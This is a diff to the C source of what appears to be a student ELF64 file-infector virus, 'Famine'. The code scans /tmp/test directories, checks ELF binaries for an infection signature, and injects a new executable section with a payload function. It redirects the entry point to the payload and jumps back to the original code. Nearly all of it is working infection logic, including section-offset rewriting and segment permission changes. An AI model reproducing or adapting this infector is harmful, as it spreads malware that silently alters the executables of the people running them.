@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/05/22 21:17:01 by root              #+#    #+#             */
-/*   Updated: 2018/06/17 20:02:19 by root             ###   ########.fr       */
+/*   Updated: 2018/06/19 21:37:33 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -32,10 +32,9 @@
 void			find_files(char *dir);
 void			get_dat_elf(char *dir, char *file);
 void			pack_dat_elf(char *path, int size, char *data);
-int				dat_elf_is_infected(char *data, Elf64_Shdr *sec);
+int				dat_elf_is_infected(char *data, int size, Elf64_Shdr *sec);
 void			famine64_func(void);
 extern uint32_t	famine64_size;
-extern uint32_t	famine64_data;
 
 struct linux_dirent64 {
 	ino_t          d_ino;    /* 64-bit inode number */
@@ -49,7 +48,6 @@ int main(int ac, char **av)
 {
 	char	*direct[] = { "/tmp/test/", "/tmp/test2/" };
 
-	printf("%ld %ld %ld %ld\n", sizeof(ino_t), sizeof(off_t), sizeof(unsigned short), sizeof(unsigned char));
 	find_files(direct[0]);
 	find_files(direct[1]);
 	return 0;
@@ -124,7 +122,7 @@ void	get_dat_elf(char *dir, char *file)
 
 void		pack_dat_elf(char *path, int size, char *data)
 {
-	printf("file: %s \\ ", path);
+	printf("file: %s", path);
 	if (data[0] == 0x7f && data[1] == 'E' && data[2] == 'L' && data[3] == 'F' &&
 		data[4] == ELFCLASS64 && data[5] != 0 && data[6] == 1 && (data[16] == 2 || data[16] == 3))
 	{
@@ -154,14 +152,14 @@ void		pack_dat_elf(char *path, int size, char *data)
 		if (isection == NULL) /* Weird if its NULL */
 			return ;
 
-		if (dat_elf_is_infected(data, isection))
+		if (dat_elf_is_infected(data, size, isection))
 			return ;
 		Elf64_Shdr newsect;
 		newsect.sh_name = 0;
 		newsect.sh_type = SHT_PROGBITS;
 		newsect.sh_flags = 0x6;
-		newsect.sh_addr = iprogram->p_vaddr - iprogram->p_offset + isection->sh_offset + isection->sh_size;
-		newsect.sh_offset = isection->sh_offset + isection->sh_size;
+		newsect.sh_addr = isection->sh_addr;
+		newsect.sh_offset = isection->sh_offset;
 		newsect.sh_size = famine64_size;
 		newsect.sh_link = 0;
 		newsect.sh_info = 0;
@@ -172,9 +170,8 @@ void		pack_dat_elf(char *path, int size, char *data)
 
 		/* 3. Modify sections offset higher than where we will wrote our code */
 		for (size_t i = 0; i < ((Elf64_Ehdr *)data)->e_shnum; i++) {
-			if (section[i].sh_offset >= iprogram->p_offset + iprogram->p_filesz &&
-				&section[i] != isection) {
-				section[i].sh_offset += isection->sh_size + famine64_size;
+			if (section[i].sh_offset >= newsect.sh_offset) {
+				section[i].sh_offset += famine64_size;
 				if (section[i].sh_link > isectionnb)
 					section[i].sh_link += 1;
 			}
@@ -183,7 +180,7 @@ void		pack_dat_elf(char *path, int size, char *data)
 		/* 4. Change the elf header */
 		Elf64_Addr old_entry = ((Elf64_Ehdr *)data)->e_entry;
 		((Elf64_Ehdr *)data)->e_entry = newsect.sh_addr;
-		((Elf64_Ehdr *)data)->e_shoff += isection->sh_size + famine64_size;
+		((Elf64_Ehdr *)data)->e_shoff += famine64_size;
 		((Elf64_Ehdr *)data)->e_shnum += 1;
 		((Elf64_Ehdr *)data)->e_shstrndx += 1;
 
@@ -193,7 +190,7 @@ void		pack_dat_elf(char *path, int size, char *data)
 		iprogram->p_flags |= PF_W;
 		iprogram->p_flags |= PF_X;
 		iprogram->p_memsz += famine64_size;
-		iprogram->p_filesz = iprogram->p_memsz;
+		iprogram->p_filesz += famine64_size;
 		while (iprogram->p_align < newsect.sh_offset + famine64_size)
 			iprogram->p_align += getpagesize();
 
@@ -205,30 +202,38 @@ void		pack_dat_elf(char *path, int size, char *data)
 			return ;
 		}
 
+		isection->sh_addr = 0;
+		isection->sh_offset = 0;
+		isection->sh_size = 0;
 		/* Re-write the file */
-		size_t off = isection->sh_offset;
+		size_t off = newsect.sh_offset;
 		if (write(fd, data, off) < 0)
 			return ;
-		for (uint32_t i = 0; i < isection->sh_size; i++)
-			write(fd, "\0", 1);
+		/* for (uint32_t i = 0; i < isection->sh_size; i++) */
+		/* 	write(fd, "\0", 1); */
 		if (write(fd, &famine64_func, famine64_size - sizeof(old_entry)) < 0)
 			return ;
 		Elf64_Addr jump = old_entry - newsect.sh_addr;
+		printf(" - jump:%#llx (%lld %#llx)\n", jump, jump, -jump);
 		if (write(fd, &jump, sizeof(jump)) < 0)
 			return ;
-		size_t off2 = (uint64_t)isection - (uint64_t)data + sizeof(*isection);
+		size_t off2 = (uint64_t)isection - (uint64_t)data;
 		write(fd, data + off, off2 - off);
 		write(fd, &newsect, sizeof(newsect));
 		off = off2;
 		write(fd, data + off, size - off - 1);
+		/* write(fd, data + off, size - off - 1); */
+		/* write(fd, &newsect, sizeof(newsect)); */
 		syscall(CLOSE, fd);
 	}
 }
 
-int		dat_elf_is_infected(char *data, Elf64_Shdr *sec)
+int		dat_elf_is_infected(char *data, int size, Elf64_Shdr *sec)
 {
-	uint64_t signature = *(uint64_t *)(data + sec->sh_offset + sec->sh_size - 16);
-	printf("%#llx\n", signature);
+	uint64_t signature = -1;
+	if (sec->sh_offset + sec->sh_size < size)
+		signature = *(uint64_t *)(data + sec->sh_offset + sec->sh_size - 16);
+	printf(" - signature:%#llx", signature);
 	if (((Elf64_Ehdr *)data)->e_ident[EI_DATA] == 1) // Little-endian
 		return (signature == 0x24EFAC2442CAFE42);
 	return (signature == 0x42CAFE4224EFAC24);
